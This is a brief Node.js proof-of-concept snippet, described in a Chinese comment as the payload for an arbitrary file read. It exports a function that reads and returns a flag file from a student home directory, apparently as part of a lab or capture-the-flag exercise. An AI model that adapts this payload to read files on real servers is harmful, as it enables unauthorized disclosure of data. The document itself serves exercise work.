//POC的差分代码块，在POC中是nodejs任意文件读取的payload
const fs = require("fs");

exports.execute = async () => {
    const flagFilePath = '/home/student/notebook/proof.txt';
    if (!fs.existsSync(flagFilePath)) {
      return { message: "Flag file not found." };
    }
    const flag = fs.readFileSync(flagFilePath, 'utf8');
    return { message: `Flag: ${flag}` };
};